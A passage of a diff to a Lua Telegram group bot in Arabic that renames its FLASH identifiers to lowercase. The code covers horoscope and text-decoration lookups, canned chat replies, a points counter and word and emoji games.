-if text and text:match("^برج (.*)$") and FLASH11(msg)  or text and text:match("^برجي (.*)$") and FLASH11(msg) then 
+--     By Developer flash     -- 
+if text and text:match("^برج (.*)$") and flash11(msg)  or text and text:match("^برجي (.*)$") and flash11(msg) then 
 local TextBrg = text:match("^برج (.*)$") or text:match("^برجي (.*)$") 
 UrlBrg = https.request('https://apiabs.ml/brg.php?brg='..URL.escape(TextBrg)) 
 Brg = JSON.decode(UrlBrg) 
 t = Brg.ok.abs  
-FLASHdx(msg.chat_id_, msg.id_, 1, t, 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, t, 1, 'html')
 end
-if FLASHdx1:get(FLASH..'Zrf:add'..msg.chat_id_..''..msg.sender_user_id_) then 
+if flashdx1:get(flash..'Zrf:add'..msg.chat_id_..''..msg.sender_user_id_) then 
 if text == 'الغاء' then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء امر الزخرفه ،', 1, 'md')
-FLASHdx1:del(FLASH..'Zrf:add'..msg.chat_id_..''..msg.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء امر الزخرفه ،', 1, 'md')
+flashdx1:del(flash..'Zrf:add'..msg.chat_id_..''..msg.sender_user_id_)
 return false  
 end 
 UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(text)) 
@@ -3442,16 +3442,16 @@ for k,v in pairs(Zrf.ok) do
 i = i + 1
 t = t..i.." `"..v.."` \n"
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, t, 1, 'md')
-FLASHdx1:del(FLASH..'Zrf:add'..msg.chat_id_..''..msg.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1, t, 1, 'md')
+flashdx1:del(flash..'Zrf:add'..msg.chat_id_..''..msg.sender_user_id_)
 return false   
 end
---     By Developer FLASH     -- 
-if text == 'زخرفه' and FLASH11(msg) or text == 'الزخرفه' and FLASH11(msg)  then  
-FLASHdx1:setex(FLASH.."Zrf:add"..msg.chat_id_..""..msg.sender_user_id_,10000,true)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫  لي الكلمه لزخرفتها \n❅∫  الزخرفه باللغه : { en } ~ { ar } ', 1, 'md')
+--     By Developer flash     -- 
+if text == 'زخرفه' and flash11(msg) or text == 'الزخرفه' and flash11(msg)  then  
+flashdx1:setex(flash.."Zrf:add"..msg.chat_id_..""..msg.sender_user_id_,10000,true)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫  لي الكلمه لزخرفتها \n❅∫  الزخرفه باللغه : { en } ~ { ar } ', 1, 'md')
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text and text:match("^زخرفه (.*)$") or text and text:match("^زخرف (.*)$") then 
 local TextZrf = text:match("^زخرفه (.*)$") or text:match("^زخرف (.*)$") 
 UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZrf)) 
@@ -3462,51 +3462,51 @@ for k,v in pairs(Zrf.ok) do
 i = i + 1
 t = t..i.."⌯ `"..v.."` \n"
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, t, 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, t, 1, 'md')
 end
---     By Developer FLASH     -- 
-if text == 'دي' or text == 'ديي' or text == 'دي بابه' then if not FLASHdx1:get(FLASH..'bot:rep:mute'..msg.chat_id_) then local FLASH = { "آخـلُِآقٌڪ آلُِعٍآر 😐✨","أتجاوزكك بسرعتي أمريي لله 🙁🙌🏾"}  FLASHdx12 = math.random(#FLASH) FLASHdx(msg.chat_id_, msg.id_, 1, FLASH[FLASHdx12] , 1, 'md') end end
-if text == 'السلام عليكم' or text == 'سلام عليكم' or text == 'سلام'  then if not FLASHdx1:get(FLASH..'bot:rep:mute'..msg.chat_id_) then FLASH =  "ياھَہّلْاا ۅﻋ̝̚لْيڪْم الْﺳ̭͠ لْام 𖠙 🤤♥️" else FLASH = '' end FLASHdx(msg.chat_id_, msg.id_, 1, FLASH, 1, 'md') end
-if text == '😭💔' or text == '😭😭' or text == '😭😭😭' or text == '😿💔' or text == '😭😭😭' or text == '😭😭😭😭' then if not FLASHdx1:get(FLASH..'bot:rep:mute'..msg.chat_id_) then FLASH =  "شبيكك حياتيي 🥺💘" else FLASH = '' end FLASHdx(msg.chat_id_, msg.id_, 1, FLASH, 1, 'md') end
-if text == '🌚💔' or text == '💔🌚' or text == '🚶‍♂💔' or text == '💔' or text == '😔💔' or text == '🚶‍♀💔' or text == '😭' then if not FLASHdx1:get(FLASH..'bot:rep:mute'..msg.chat_id_) then FLASH =  "شبّيي الحلو 😿💔" else FLASH = '' end FLASHdx(msg.chat_id_, msg.id_, 1, FLASH, 1, 'md') end
-if text == 'باي' or text == 'بااي' or text == 'اروح' or text == 'اروح احسن' or text == 'اولي احسن' or text == 'راح اروح' or text == 'باي انام' then if not FLASHdx1:get(FLASH..'bot:rep:mute'..msg.chat_id_) then FLASH =  "توككل بس خلصنةه 🌝😂" else FLASH = '' end FLASHdx(msg.chat_id_, msg.id_, 1, FLASH, 1, 'md') end
-if text == 'هلو' or text == 'هلاو' or text == 'هلا' or text == 'هلاوو' or text == 'هيلاو' or text == 'هيلاوو' or text == 'هلاا' then if not FLASHdx1:get(FLASH..'bot:rep:mute'..msg.chat_id_) then local FLASH = {  "اࠗط็لق֯ق֯ هٞللاࠗ୨و 𖠙 🤤♥️" ,  "هۂَلاا نۨہٰورتت يعمۘري 𖠙 🤤♥️" } FLASHdx12 = math.random(#FLASH) FLASHdx(msg.chat_id_, msg.id_, 1, FLASH[FLASHdx12] , 1, 'md') end end
-if text == 'شونك' or text == 'شونج' or text == 'شلونك' or text == 'شلونج' or text == 'شونكم' or text == 'شلونكم' or text == 'شلخبار' or text == 'شلون الاخبار' or text == 'شخبارك' then if not FLASHdx1:get(FLASH..'bot:rep:mute'..msg.chat_id_) then  local FLASH = {  "ني زينن وانت يعمريي 🥺💘" ,  "ماشيهه يعمري 😻💘",  "تمامم عمرري وانتت 🤤💘", } FLASHdx12 = math.random(#FLASH) FLASHdx(msg.chat_id_, msg.id_, 1, FLASH[FLASHdx12] , 1, 'md') FLASHdx(msg.chat_id_, msg.id_, 1, FLASH, 1, 'md') end end
-if text == 'وينك' or text == 'وينج' then  if not FLASHdx1:get(FLASH..'bot:rep:mute'..msg.chat_id_) then FLASH =  "مْوٌجہوٌدِ يہمْگُ يحلوُ  😉♥️" else FLASH = '' end FLASHdx(msg.chat_id_, msg.id_, 1, FLASH, 1, 'md') end
-if text == 'بوت ملطلط' then  if not FLASHdx1:get(FLASH..'bot:rep:mute'..msg.chat_id_) then FLASH =  "ربي صبرني 😞🌾" else  FLASH = '' end  FLASHdx(msg.chat_id_, msg.id_, 1, FLASH, 1, 'md') end
-if text == 'نايمين' or text == 'ميتين' then  if not FLASHdx1:get(FLASH..'bot:rep:mute'..msg.chat_id_) then FLASH =  "ني سهران احرسكمم 😻🍃" else  FLASH = '' end  FLASHdx(msg.chat_id_, msg.id_, 1, FLASH, 1, 'md') end
-if text == 'هلوباي' or text == 'هلو باي' then  if not FLASHdx1:get(FLASH..'bot:rep:mute'..msg.chat_id_) then FLASH =  "رايحح لو جايي ، 😻😹" else  FLASH = '' end  FLASHdx(msg.chat_id_, msg.id_, 1, FLASH, 1, 'md') end
-if text == 'اكلك' or text == 'اكلج' or text == 'اكلكم' then if not FLASHdx1:get(FLASH..'bot:rep:mute'..msg.chat_id_) then FLASH =  "ڪوولُِ مآڪوولُِ لُِآحٍدِ  😉♥️" else FLASH = '' end FLASHdx(msg.chat_id_, msg.id_, 1, FLASH, 1, 'md') end
-if text == 'فرخ' then  if not FLASHdx1:get(FLASH..'bot:rep:mute'..msg.chat_id_) then FLASH =  "ٰوينۨہهۂَ خۡل احۡصرهۂَ ، 😹♥️" else  FLASH = '' end  FLASHdx(msg.chat_id_, msg.id_, 1, FLASH, 1, 'md') end
-if text == 'سورس فلاش' or text == 'سورس ديف فلاش' or text == 'سورس انور'  then if not FLASHdx1:get(FLASH..'bot:rep:mute'..msg.chat_id_) then FLASH =  "تااج وباجج حبيي ، 😹🌝" else FLASH = '' end FLASHdx(msg.chat_id_, msg.id_, 1, FLASH, 1, 'md') end 
-if text == 'احبك' then  if not FLASHdx1:get(FLASH..'bot:rep:mute'..msg.chat_id_) then local FLASH = { "ٰجذابةه تريدد تقطكك  ، 😹💘","ءني هم احبكك يعمري ، ☹️💘" } FLASHdx12 = math.random(#FLASH) FLASHdx(msg.chat_id_, msg.id_, 1, FLASH[FLASHdx12] , 1, 'md') end end
-if text == 'احبج' then  if not FLASHdx1:get(FLASH..'bot:rep:mute'..msg.chat_id_) then local FLASH =  { "ٰجذابب يريد يطككج ، 😹💘","ااخ بسس اموتت بيكك ، 🥺💘" } FLASHdx12 = math.random(#FLASH) FLASHdx(msg.chat_id_, msg.id_, 1, FLASH[FLASHdx12] , 1, 'md') end end
-if text == 'بوت' and FLASH11(msg) then  name_bot = (FLASHdx1:get('FLASH:'..bot_id..'name_bot') or 'فلاش')  local FLASH = {  "أسمي "..name_bot.." يعمري ",  "أسمي "..name_bot.." يقميل ",  "تره أسمي "..name_bot.." كافي بوت ",  "انت البوت لك اسمي "..name_bot.." ", }  FLASH2 = math.random(#FLASH) FLASHdx(msg.chat_id_, msg.id_, 1, FLASH[FLASH2] , 1, 'md')  end
-if (text and text == (FLASHdx1:get('FLASH:'..bot_id..'name_bot') or 'فلاش')) then name_bot = (FLASHdx1:get('FLASH:'..bot_id..'name_bot') or 'فلاش') local namebot = {  'عيون '..name_bot..' العسليات ؛🤭☄',  'اطلقق من يصيح '..name_bot..' ؛😻💗',  'وياك '..name_bot..' عمري أمرني 🌾' } name = math.random(#namebot) FLASHdx(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'md') return false end
---     By Developer FLASH     -- 
-if text =='نقاطي' and FLASH11(msg) then 
-if tonumber((FLASHdx1:get(FLASH..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
-FLASH0 = '❅∫ ليس لديك نقاط العب اولا ، \n❅∫ للعب ارسل { الالعاب } .'
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH0, 1, 'md')
+--     By Developer flash     -- 
+if text == 'دي' or text == 'ديي' or text == 'دي بابه' then if not flashdx1:get(flash..'bot:rep:mute'..msg.chat_id_) then local flash = { "آخـلُِآقٌڪ آلُِعٍآر 😐✨","أتجاوزكك بسرعتي أمريي لله 🙁🙌🏾"}  flashdx12 = math.random(#flash) flashdx(msg.chat_id_, msg.id_, 1, flash[flashdx12] , 1, 'md') end end
+if text == 'السلام عليكم' or text == 'سلام عليكم' or text == 'سلام'  then if not flashdx1:get(flash..'bot:rep:mute'..msg.chat_id_) then flash =  "ياھَہّلْاا ۅﻋ̝̚لْيڪْم الْﺳ̭͠ لْام 𖠙 🤤♥️" else flash = '' end flashdx(msg.chat_id_, msg.id_, 1, flash, 1, 'md') end
+if text == '😭💔' or text == '😭😭' or text == '😭😭😭' or text == '😿💔' or text == '😭😭😭' or text == '😭😭😭😭' then if not flashdx1:get(flash..'bot:rep:mute'..msg.chat_id_) then flash =  "شبيكك حياتيي 🥺💘" else flash = '' end flashdx(msg.chat_id_, msg.id_, 1, flash, 1, 'md') end
+if text == '🌚💔' or text == '💔🌚' or text == '🚶‍♂💔' or text == '💔' or text == '😔💔' or text == '🚶‍♀💔' or text == '😭' then if not flashdx1:get(flash..'bot:rep:mute'..msg.chat_id_) then flash =  "شبّيي الحلو 😿💔" else flash = '' end flashdx(msg.chat_id_, msg.id_, 1, flash, 1, 'md') end
+if text == 'باي' or text == 'بااي' or text == 'اروح' or text == 'اروح احسن' or text == 'اولي احسن' or text == 'راح اروح' or text == 'باي انام' then if not flashdx1:get(flash..'bot:rep:mute'..msg.chat_id_) then flash =  "توككل بس خلصنةه 🌝😂" else flash = '' end flashdx(msg.chat_id_, msg.id_, 1, flash, 1, 'md') end
+if text == 'هلو' or text == 'هلاو' or text == 'هلا' or text == 'هلاوو' or text == 'هيلاو' or text == 'هيلاوو' or text == 'هلاا' then if not flashdx1:get(flash..'bot:rep:mute'..msg.chat_id_) then local flash = {  "اࠗط็لق֯ق֯ هٞللاࠗ୨و 𖠙 🤤♥️" ,  "هۂَلاا نۨہٰورتت يعمۘري 𖠙 🤤♥️" } flashdx12 = math.random(#flash) flashdx(msg.chat_id_, msg.id_, 1, flash[flashdx12] , 1, 'md') end end
+if text == 'شونك' or text == 'شونج' or text == 'شلونك' or text == 'شلونج' or text == 'شونكم' or text == 'شلونكم' or text == 'شلخبار' or text == 'شلون الاخبار' or text == 'شخبارك' then if not flashdx1:get(flash..'bot:rep:mute'..msg.chat_id_) then  local flash = {  "ني زينن وانت يعمريي 🥺💘" ,  "ماشيهه يعمري 😻💘",  "تمامم عمرري وانتت 🤤💘", } flashdx12 = math.random(#flash) flashdx(msg.chat_id_, msg.id_, 1, flash[flashdx12] , 1, 'md') flashdx(msg.chat_id_, msg.id_, 1, flash, 1, 'md') end end
+if text == 'وينك' or text == 'وينج' then  if not flashdx1:get(flash..'bot:rep:mute'..msg.chat_id_) then flash =  "مْوٌجہوٌدِ يہمْگُ يحلوُ  😉♥️" else flash = '' end flashdx(msg.chat_id_, msg.id_, 1, flash, 1, 'md') end
+if text == 'بوت ملطلط' then  if not flashdx1:get(flash..'bot:rep:mute'..msg.chat_id_) then flash =  "ربي صبرني 😞🌾" else  flash = '' end  flashdx(msg.chat_id_, msg.id_, 1, flash, 1, 'md') end
+if text == 'نايمين' or text == 'ميتين' then  if not flashdx1:get(flash..'bot:rep:mute'..msg.chat_id_) then flash =  "ني سهران احرسكمم 😻🍃" else  flash = '' end  flashdx(msg.chat_id_, msg.id_, 1, flash, 1, 'md') end
+if text == 'هلوباي' or text == 'هلو باي' then  if not flashdx1:get(flash..'bot:rep:mute'..msg.chat_id_) then flash =  "رايحح لو جايي ، 😻😹" else  flash = '' end  flashdx(msg.chat_id_, msg.id_, 1, flash, 1, 'md') end
+if text == 'اكلك' or text == 'اكلج' or text == 'اكلكم' then if not flashdx1:get(flash..'bot:rep:mute'..msg.chat_id_) then flash =  "ڪوولُِ مآڪوولُِ لُِآحٍدِ  😉♥️" else flash = '' end flashdx(msg.chat_id_, msg.id_, 1, flash, 1, 'md') end
+if text == 'فرخ' then  if not flashdx1:get(flash..'bot:rep:mute'..msg.chat_id_) then flash =  "ٰوينۨہهۂَ خۡل احۡصرهۂَ ، 😹♥️" else  flash = '' end  flashdx(msg.chat_id_, msg.id_, 1, flash, 1, 'md') end
+if text == 'سورس فلاش' or text == 'سورس ديف فلاش' or text == 'سورس انور'  then if not flashdx1:get(flash..'bot:rep:mute'..msg.chat_id_) then flash =  "تااج وباجج حبيي ، 😹🌝" else flash = '' end flashdx(msg.chat_id_, msg.id_, 1, flash, 1, 'md') end 
+if text == 'احبك' then  if not flashdx1:get(flash..'bot:rep:mute'..msg.chat_id_) then local flash = { "ٰجذابةه تريدد تقطكك  ، 😹💘","ءني هم احبكك يعمري ، ☹️💘" } flashdx12 = math.random(#flash) flashdx(msg.chat_id_, msg.id_, 1, flash[flashdx12] , 1, 'md') end end
+if text == 'احبج' then  if not flashdx1:get(flash..'bot:rep:mute'..msg.chat_id_) then local flash =  { "ٰجذابب يريد يطككج ، 😹💘","ااخ بسس اموتت بيكك ، 🥺💘" } flashdx12 = math.random(#flash) flashdx(msg.chat_id_, msg.id_, 1, flash[flashdx12] , 1, 'md') end end
+if text == 'بوت' and flash11(msg) then  name_bot = (flashdx1:get('flash:'..bot_id..'name_bot') or 'فلاش')  local flash = {  "أسمي "..name_bot.." يعمري ",  "أسمي "..name_bot.." يقميل ",  "تره أسمي "..name_bot.." كافي بوت ",  "انت البوت لك اسمي "..name_bot.." ", }  flash2 = math.random(#flash) flashdx(msg.chat_id_, msg.id_, 1, flash[flash2] , 1, 'md')  end
+if (text and text == (flashdx1:get('flash:'..bot_id..'name_bot') or 'فلاش')) then name_bot = (flashdx1:get('flash:'..bot_id..'name_bot') or 'فلاش') local namebot = {  'عيون '..name_bot..' العسليات ؛🤭☄',  'اطلقق من يصيح '..name_bot..' ؛😻💗',  'وياك '..name_bot..' عمري أمرني 🌾' } name = math.random(#namebot) flashdx(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'md') return false end
+--     By Developer flash     -- 
+if text =='نقاطي' and flash11(msg) then 
+if tonumber((flashdx1:get(flash..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
+flash0 = '❅∫ ليس لديك نقاط العب اولا ، \n❅∫ للعب ارسل { الالعاب } .'
+flashdx(msg.chat_id_, msg.id_, 1,flash0, 1, 'md')
 else
-FLASH = '❅∫ لديك ('..(FLASHdx1:get(FLASH..'bot:add:num'..msg.chat_id_..msg.sender_user_id_))..') نقطه ،'
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
+flash = '❅∫ لديك ('..(flashdx1:get(flash..'bot:add:num'..msg.chat_id_..msg.sender_user_id_))..') نقطه ،'
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
 end end
---     By Developer FLASH     -- 
-if text ==  'مسح رسائلي' and FLASH11(msg) then
-FLASHdx1:del('FLASH:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم مسح رسائلك المضافه . ', 1, 'md')
+--     By Developer flash     -- 
+if text ==  'مسح رسائلي' and flash11(msg) then
+flashdx1:del('flash:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم مسح رسائلك المضافه . ', 1, 'md')
 end
---     By Developer FLASH     --
+--     By Developer flash     --
 if text == 'سمايلات' then
-if FLASHdx1:get(FLASH..'bot:lock_geam'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
-return "FLASH"
+if flashdx1:get(flash..'bot:lock_geam'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
+return "flash"
 end
-FLASHdx1:del(FLASH..'bot:l:ids'..msg.chat_id_)
-FLASH2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','??','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','??','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🧼','🎻','🎸','??','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','🩸','🎗','🏵','🎖','🧼','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
-name = FLASH2[math.random(#FLASH2)]
-FLASHdx1:set(FLASH..'bot:klmos'..msg.chat_id_,name)
+flashdx1:del(flash..'bot:l:ids'..msg.chat_id_)
+flash2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','??','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','??','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🧼','🎻','🎸','??','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','🩸','🎗','🏵','🎖','🧼','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
+name = flash2[math.random(#flash2)]
+flashdx1:set(flash..'bot:klmos'..msg.chat_id_,name)
 name = string.gsub(name,'🍞','🍞') name = string.gsub(name,'🥖','🥖') name = string.gsub(name,'🥨','🥨') name = string.gsub(name,'🧀','🧀')
 name = string.gsub(name,'🥚','🥚') name = string.gsub(name,'🍳','🍳') name = string.gsub(name,'🥞','🥞') name = string.gsub(name,'🥓','🥓')
 name = string.gsub(name,'🥩','🥩') name = string.gsub(name,'🍗','🍗') name = string.gsub(name,'🍖','🍖') name = string.gsub(name,'🌭','🌭')
@@ -3536,27 +3536,27 @@ name = string.gsub(name,'🔮','🔮') name = string.gsub(name,'🌡','🌡')  n
 name = string.gsub(name,'⏱','⏱') name = string.gsub(name,'🛢','🛢') name = string.gsub(name,'📓','📒') name = string.gsub(name,'📗','📗')
 name = string.gsub(name,'📂','🗂') name = string.gsub(name,'📅','📆') name = string.gsub(name,'📪','📪') name = string.gsub(name,'📫','📫')
 name = string.gsub(name,'📬','📬') name = string.gsub(name,'📭','📭') name = string.gsub(name,'⏰','⏰') name = string.gsub(name,'📺','📺') name = string.gsub(name,'🎚','🎚') name = string.gsub(name,'☎️','☎️')
-FLASH = '❅∫ اول واحد يدز هذا السمايل  {'..name..'} يربح ،'
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
+flash = '❅∫ اول واحد يدز هذا السمايل  {'..name..'} يربح ،'
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
 end
-if text == ''..(FLASHdx1:get(FLASH..'bot:klmos'..msg.chat_id_) or 'لفاتع')..'' and not FLASHdx1:get(FLASH..'bot:l:ids'..msg.chat_id_) then
-if not FLASHdx1:get(FLASH..'bot:l:ids'..msg.chat_id_) then 
-FLASH = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل سمايلات . '
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
-FLASHdx1:incrby(FLASH..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
+if text == ''..(flashdx1:get(flash..'bot:klmos'..msg.chat_id_) or 'لفاتع')..'' and not flashdx1:get(flash..'bot:l:ids'..msg.chat_id_) then
+if not flashdx1:get(flash..'bot:l:ids'..msg.chat_id_) then 
+flash = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل سمايلات . '
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
+flashdx1:incrby(flash..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-FLASHdx1:set(FLASH..'bot:l:ids'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:l:ids'..msg.chat_id_,true)
 end
---     By Developer FLASH     -- 
-if text == 'ترتيب' and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'bot:lock_geam'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
-return "FLASH"
+--     By Developer flash     -- 
+if text == 'ترتيب' and flash11(msg) then
+if flashdx1:get(flash..'bot:lock_geam'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
+return "flash"
 end
-FLASHdx1:del(FLASH..'bot:l:id'..msg.chat_id_)
-FLASH2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
-name = FLASH2[math.random(#FLASH2)]
-FLASHdx1:set(FLASH..'bot:klmo'..msg.chat_id_,name)
+flashdx1:del(flash..'bot:l:id'..msg.chat_id_)
+flash2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
+name = flash2[math.random(#flash2)]
+flashdx1:set(flash..'bot:klmo'..msg.chat_id_,name)
 name = string.gsub(name,'سحور','س ر و ح') name = string.gsub(name,'سياره','ه ر س ي ا') name = string.gsub(name,'استقبال','ل ب ا ت ق س ا') name = string.gsub(name,'قنفه','ه ق ن ف')
 name = string.gsub(name,'ايفون','و ن ف ا') name = string.gsub(name,'بزونه','ز و ه ن') name = string.gsub(name,'مطبخ','خ ب ط م') name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
 name = string.gsub(name,'دجاجه','ج ج ا د ه') name = string.gsub(name,'مدرسه','ه م د ر س') name = string.gsub(name,'الوان','ن ا و ا ل') name = string.gsub(name,'غرفه','غ ه ر ف')
@@ -3567,35 +3567,35 @@ name = string.gsub(name,'سلمون','ن م و ل س') name = string.gsub(name,'
 name = string.gsub(name,'مطرقه','ه ط م ر ق') name = string.gsub(name,'بتيته','ب ت ت ي ه') name = string.gsub(name,'لهانه','ه ن ل ه ل') name = string.gsub(name,'شباك','ب ش ا ك')
 name = string.gsub(name,'باص','ص ا ب') name = string.gsub(name,'سمكه','ك س م ه') name = string.gsub(name,'ذباب','ب ا ب ذ') name = string.gsub(name,'تلفاز','ت ف ل ز ا')
 name = string.gsub(name,'حاسوب','س ا ح و ب') name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت') name = string.gsub(name,'ساحه','ح ا ه س') name = string.gsub(name,'جسر','ر ج س')
-FLASH = '❅∫ اول واحد يرتبها  {'..name..'} يربح ،'
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
+flash = '❅∫ اول واحد يرتبها  {'..name..'} يربح ،'
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
 end
-if text == ''..(FLASHdx1:get(FLASH..'bot:klmo'..msg.chat_id_) or 'لفاتع')..'' and not FLASHdx1:get(FLASH..'bot:l:id'..msg.chat_id_) then
-if not FLASHdx1:get(FLASH..'bot:l:id'..msg.chat_id_) then 
-FLASH = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل ترتيب . '
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
-FLASHdx1:incrby(FLASH..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
+if text == ''..(flashdx1:get(flash..'bot:klmo'..msg.chat_id_) or 'لفاتع')..'' and not flashdx1:get(flash..'bot:l:id'..msg.chat_id_) then
+if not flashdx1:get(flash..'bot:l:id'..msg.chat_id_) then 
+flash = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل ترتيب . '
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
+flashdx1:incrby(flash..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-FLASHdx1:set(FLASH..'bot:l:id'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:l:id'..msg.chat_id_,true)
 end
---     By Developer FLASH     -- 
-if text == 'كت تويت' and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'bot:lock_geam'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
-return "FLASH"
+--     By Developer flash     -- 
+if text == 'كت تويت' and flash11(msg) then
+if flashdx1:get(flash..'bot:lock_geam'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
+return "flash"
 end
-local FLASH = {  "آخر مرة زرت مدينة الملاهي؟",  "آخر مرة أكلت أكلتك المفضّلة؟",  "الوضع الحالي؟\n‏1. سهران\n‏2. ضايج\n‏3. أتأمل",  "آخر شيء ضاع منك؟","كلمة أخيرة لشاغل البال؟","طريقتك المعتادة في التخلّص من الطاقة السلبية؟","شهر من أشهر العام له ذكرى جميلة معك؟","كلمة غريبة من لهجتك ومعناها؟🤓","‏- شيء سمعته عالق في ذهنك هاليومين؟","متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟","‏- أبرز صفة حسنة في صديقك المقرب؟","هل تشعر أن هنالك مَن يُحبك؟","اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، موقفك الصريح؟","أجمل شيء حصل معك خلال هاليوم؟","صِف شعورك وأنت تُحب شخص يُحب غيرك؟👀💔","كلمة لشخص غالي اشتقت إليه؟💕","آخر خبر سعيد، متى وصلك؟","أنا آسف على ....؟","أوصف نفسك بكلمة؟","صريح، مشتاق؟","‏- صريح، هل سبق وخذلت أحدهم ولو عن غير قصد؟","‏- ماذا ستختار من الكلمات لتعبر لنا عن حياتك التي عشتها الى 